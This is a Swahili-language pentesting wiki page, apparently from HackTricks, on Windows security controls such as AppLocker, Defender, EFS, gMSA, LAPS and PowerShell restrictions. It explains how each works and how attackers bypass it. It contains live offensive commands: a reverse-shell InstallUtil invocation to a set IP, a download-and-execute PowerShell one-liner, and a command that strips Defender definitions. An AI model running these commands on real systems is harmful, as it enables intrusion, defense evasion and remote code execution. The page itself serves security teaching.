# Vidhibiti vya Usalama vya Windows

{{#include ../banners/hacktricks-training.md}}

## Sera ya AppLocker

Orodha ya ruhusa za application ni orodha ya application au executable zilizoidhinishwa ambazo zinaruhusiwa kuwepo na kuendeshwa kwenye mfumo. Lengo ni kulinda mazingira dhidi ya malware hatari na software zisizoidhinishwa ambazo haziendani na mahitaji mahususi ya kibiashara ya shirika.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) ni **suluhisho la Microsoft la application whitelisting** na huwapa wasimamizi wa mfumo udhibiti wa **application na faili ambazo watumiaji wanaweza kuendesha**. Hutoa **udhibiti wa kina** juu ya executable, script, faili za Windows installer, DLL, packaged app, na packed app installer.\
Ni kawaida kwa mashirika **kuzuia cmd.exe na PowerShell.exe** pamoja na ruhusa ya kuandika kwenye directories fulani, **lakini yote haya yanaweza kubypassiwa**.

### Kagua

Kagua ni faili/extensions zipi zimeorodheshwa kama blacklisted/whitelisted:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Njia hii ya registry ina mipangilio na sera zinazotumiwa na AppLocker, hivyo kutoa njia ya kukagua seti ya sasa ya rules zinazotekelezwa kwenye mfumo:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- **Writable folders** muhimu za kufanya Bypass ya AppLocker Policy: Ikiwa AppLocker inaruhusu kutekeleza chochote ndani ya `C:\Windows\System32` au `C:\Windows`, kuna **writable folders** unazoweza kutumia kufanya **bypass** hii.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Binaries za [**"LOLBAS's"**](https://lolbas-project.github.io/) zinazoaminika kwa kawaida zinaweza pia kuwa muhimu katika kubypass AppLocker.
- **Rules zilizoandikwa vibaya pia zinaweza kubypass**
- Kwa mfano, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, unaweza kuunda **folder linaloitwa `allowed`** popote na litaruhusiwa.
- Organizations pia mara nyingi hulenga **kuzuia executable ya `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, lakini husahau kuhusu **maeneo mengine** ya [**PowerShell executable**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) kama `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` au `PowerShell_ISE.exe`.
- **DLL enforcement huwezeshwa mara chache sana** kutokana na mzigo wa ziada inayoweza kuweka kwenye system, pamoja na kiwango cha testing kinachohitajika kuhakikisha hakuna kitakachoharibika. Kwa hiyo kutumia **DLLs kama backdoors kutasaidia kubypass AppLocker**.
- Unaweza kutumia [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) au [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili **ku-execute** code ya **Powershell** katika process yoyote na kubypass AppLocker. Kwa maelezo zaidi angalia: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Uhifadhi wa Credentials

### Security Accounts Manager (SAM)

Credentials za local zinapatikana katika file hili, passwords zime-hash.

### Local Security Authority (LSA) - LSASS

**Credentials** (zilizo-hash) **huhifadhiwa** kwenye **memory** ya subsystem hii kwa sababu za Single Sign-On.\
**LSA** husimamia **security policy** ya local (password policy, permissions za users...), **authentication**, **access tokens**...\
LSA ndiyo **inayokagua** credentials zilizotolewa ndani ya file la **SAM** (kwa local login) na **kuwasiliana** na **domain controller** ili ku-authenticate domain user.

**Credentials** **huhifadhiwa** ndani ya **process ya LSASS**: Kerberos tickets, NT na LM hashes, na passwords zinazoweza ku-decryptiwa kwa urahisi.

### LSA secrets

LSA inaweza kuhifadhi baadhi ya credentials kwenye disk:

- Password ya computer account ya Active Directory (domain controller isiyofikika).
- Passwords za accounts za Windows services
- Passwords za scheduled tasks
- Mengine (password ya IIS applications...)

### NTDS.dit

Hii ni database ya Active Directory. Inapatikana tu kwenye Domain Controllers.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) ni Antivirus inayopatikana katika Windows 10 na Windows 11, pamoja na versions za Windows Server. **Huzuia** pentesting tools za kawaida kama **`WinPEAS`**. Hata hivyo, kuna njia za **kubypass protections hizi**.

### Check

Ili kuangalia **status** ya **Defender**, unaweza ku-execute PS cmdlet **`Get-MpComputerStatus`** (angalia value ya **`RealTimeProtectionEnabled`** ili kujua kama iko active):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Ili kui-enumerate, unaweza pia ku-run:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS hulinda faili kupitia encryption, ikitumia **symmetric key** inayojulikana kama **File Encryption Key (FEK)**. Key hii hu-encryptiwa kwa kutumia **public key** ya mtumiaji na kuhifadhiwa ndani ya **alternative data stream** ya $EFS ya faili iliyosimbwa. Decryption inapohitajika, **private key** inayolingana ya digital certificate ya mtumiaji hutumika ku-decrypt FEK kutoka kwenye stream ya $EFS. Maelezo zaidi yanaweza kupatikana [hapa](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Decryption scenarios bila user initiation** zinajumuisha:

- Faili au folder zinapohamishwa kwenye file system isiyo ya EFS, kama [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), hu-decryptiwa automatically.
- Faili zilizo-encryptiwa zinapotumwa kupitia network kwa kutumia SMB/CIFS protocol hu-decryptiwa kabla ya transmission.

Njia hii ya encryption inaruhusu **transparent access** kwa faili zilizo-encryptiwa kwa owner. Hata hivyo, kubadilisha tu password ya owner na ku-login hakutaruhusu decryption.

**Key Takeaways**:

- EFS hutumia symmetric FEK, iliyo-encryptiwa kwa public key ya mtumiaji.
- Decryption hutumia private key ya mtumiaji kufikia FEK.
- Automatic decryption hutokea chini ya conditions maalum, kama kunakili kwenye FAT32 au network transmission.
- Faili zilizo-encryptiwa zinapatikana kwa owner bila hatua za ziada.

### Check EFS info

Check ikiwa **user** **ametumia** **service** hii kwa ku-check kama path hii ipo:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Check **nani** ana **access** kwenye file kwa kutumia cipher /c \<file>\
Unaweza pia kutumia `cipher /e` na `cipher /d` ndani ya folder ili **ku-encrypt** na **ku-decrypt** faili zote

### Decrypting EFS files

#### Kuwa Authority System

Njia hii inahitaji **victim user** awe **akiendesha** **process** ndani ya host. Ikiwa ndivyo, ukitumia `meterpreter` sessions unaweza ku-impersonate token ya process ya user (`impersonate_token` kutoka `incognito`). Au unaweza tu kufanya `migrate` kwenda kwenye process ya user.

#### Kujua password ya users

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft ilitengeneza **Group Managed Service Accounts (gMSA)** ili kurahisisha usimamizi wa service accounts katika IT infrastructures. Tofauti na service accounts za kawaida ambazo mara nyingi huwa na setting ya "**Password never expire**" ikiwa enabled, gMSAs hutoa solution iliyo salama na rahisi zaidi kusimamia:

- **Automatic Password Management**: gMSAs hutumia password complex yenye characters 240 ambayo hubadilika automatically kulingana na domain au computer policy. Process hii inasimamiwa na Microsoft's Key Distribution Service (KDC), hivyo kuondoa hitaji la password updates za manual.
- **Enhanced Security**: Accounts hizi haziathiriwi na lockouts na haziwezi kutumika kwa interactive logins, hivyo kuongeza security yake.
- **Multiple Host Support**: gMSAs zinaweza kushirikiwa kwenye hosts nyingi, hivyo kuwa bora kwa services zinazoendesha kwenye servers nyingi.
- **Scheduled Task Capability**: Tofauti na managed service accounts, gMSAs zina-support kuendesha scheduled tasks.
- **Simplified SPN Management**: System hu-update automatically Service Principal Name (SPN) kunapokuwa na mabadiliko kwenye sAMaccount details au DNS name ya computer, hivyo kurahisisha SPN management.

Passwords za gMSAs huhifadhiwa kwenye LDAP property _**msDS-ManagedPassword**_ na hu-resetiwa automatically kila baada ya siku 30 na Domain Controllers (DCs). Password hii, ambayo ni encrypted data blob inayojulikana kama [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), inaweza kuretrieviwa tu na authorized administrators na servers ambazo gMSAs zimesakinishwa, hivyo kuhakikisha mazingira salama. Ili kufikia taarifa hii, secured connection kama LDAPS inahitajika, au connection lazima iwe authenticated kwa 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

Unaweza kusoma password hii kwa [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Pata maelezo zaidi katika chapisho hili**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Pia, angalia [ukurasa huu wa wavuti](https://cube0x0.github.io/Relaying-for-gMSA/) kuhusu jinsi ya kufanya **NTLM relay attack** ili **kusoma** **password** ya **gMSA**.<sup>[[3]](#references)</sup>

## LAPS

The **Local Administrator Password Solution (LAPS)**, inayopatikana kwa kupakuliwa kutoka [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), huwezesha usimamizi wa password za Administrator wa ndani. Password hizi, ambazo ni **randomized**, za kipekee, na **hubadilishwa mara kwa mara**, huhifadhiwa katikati katika Active Directory. Ufikiaji wa password hizi unazuiwa kupitia ACLs kwa watumiaji walioidhinishwa. Kwa permissions za kutosha zilizotolewa, uwezo wa kusoma password za admin wa ndani hutolewa.

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **hufunga vipengele vingi** vinavyohitajika ili kutumia PowerShell kwa ufanisi, kama vile kuzuia COM objects, kuruhusu tu .NET types zilizoidhinishwa, workflows zinazotumia XAML, PowerShell classes, na mengineyo.

### **Kagua**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
Katika Windows za sasa, Bypass hiyo haitafanya kazi, lakini unaweza kutumia[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Ili kui-compile unaweza kuhitaji** **ku** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> kuongeza `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` na **kubadilisha project iwe .Net4.5**.

#### Direct bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Unaweza kutumia [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) au [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) **kutekeleza** code ya **Powershell** katika process yoyote na kufanya bypass ya constrained mode. Kwa maelezo zaidi angalia: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Sera ya Utekelezaji ya PS

Kwa default, imewekwa kuwa **restricted.** Njia kuu za kufanya bypass ya sera hii ni:<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Zaidi inaweza kupatikana [hapa](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>

## Security Support Provider Interface (SSPI)

Ni API inayoweza kutumiwa kuthibitisha watumiaji.

SSPI itawajibika kutafuta protocol inayofaa kwa mashine mbili zinazotaka kuwasiliana. Njia inayopendelewa kwa hili ni Kerberos. Kisha SSPI itajadili ni authentication protocol ipi itakayotumika. Authentication protocols hizi huitwa Security Support Provider (SSP), ziko ndani ya kila mashine ya Windows katika mfumo wa DLL, na mashine zote mbili lazima ziunge mkono protocol hiyo ili ziweze kuwasiliana.

### Main SSPs

- **Kerberos**: Inayopendelewa
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** na **NTLMv2**: Kwa sababu za compatibility
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web servers na LDAP, password ikiwa katika mfumo wa MD5 hash
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL na TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Hutumika kujadili protocol itakayotumika (Kerberos au NTLM, ambapo Kerberos ndiyo default)
- %windir%\Windows\System32\lsasrv.dll

#### Majadiliano yanaweza kutoa methods kadhaa au moja pekee.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni feature inayowezesha **consent prompt kwa shughuli zilizoinuliwa**.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Marejeo

- [1] [Bypassing Applocker na Powershell contstrained language mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)
- [2] [jinsi ya ~ decrypt EFS files](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Relaying for gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [Njia 15 za Kuepuka PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

{{#include ../banners/hacktricks-training.md}}
